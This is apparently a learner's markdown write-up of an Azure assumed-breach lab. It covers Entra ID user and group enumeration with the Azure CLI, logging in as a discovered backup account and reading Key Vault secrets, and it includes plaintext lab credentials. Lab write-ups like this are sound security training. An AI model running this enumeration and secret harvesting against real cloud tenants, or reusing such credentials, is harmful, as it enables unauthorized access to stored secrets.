---
title: The Wareville’s Key Vault grew three sizes that day
draft: false
tags:
---

[[Azure]]

### Assumed Breach Scenario
It is a type of penetration testing setup in which an initial access or foothold is provided, mimicking the scenario in which an attacker has already established its access inside the internal network

12265919
usr-12265919@aoc2024.onmicrosoft.com
2a8'_l9IJX.%Flt8

### Going Down the Azure Rabbit Hole
We will use Azure Cloud Shell

#### Entra ID Enumeration
```bash
az ad user list
```

The Azure CLI typically uses the following command syntax: `az GROUP SUBGROUP ACTION OPTIONAL_PARAMETERS`.

Using filters
```bash
az ad user list --filter "startsWith('wvusr-', displayName)"
```

Listing groups
```bash
az ad group list
```

Founded the target group, we list all the group members
```bash
az ad group member list --group "Secret Recovery Group"
```


We then login in the shell with the new discovered account

```bash
az account clear
az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R3c0v3r_s3cr3ts!
```


#### Azure Role Assignments
It defines the resources that each user or group can access

```bash
az role assignment list --assignee 7d96660a-02e1-4112-9515-1762d0cb66b7 --all
```

We find two roles

| **Role**               | **Microsoft Definition**                                                                                         | **Explanation**                                                                                                                                                    |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Key Vault Reader       | Read metadata of key vaults and its certificates, keys, and secrets.                                             | This role allows you to read metadata of key vaults and its certificates, keys, and secrets. Cannot read sensitive values such as secret contents or key material. |
| Key Vault Secrets User | Read secret contents. Only works for key vaults that use the 'Azure role-based access control' permission model. | This special role allows you to read the contents of a Key Vault Secret.                                                                                           |


#### Azure Key Vault
```bash
az keyvault list
```

List secrets
```bash
az keyvault secret list --vault-name warevillesecrets
```

Read the secret content
```bash
az keyvault secret show --vault-name warevillesecrets --name aoc2024
```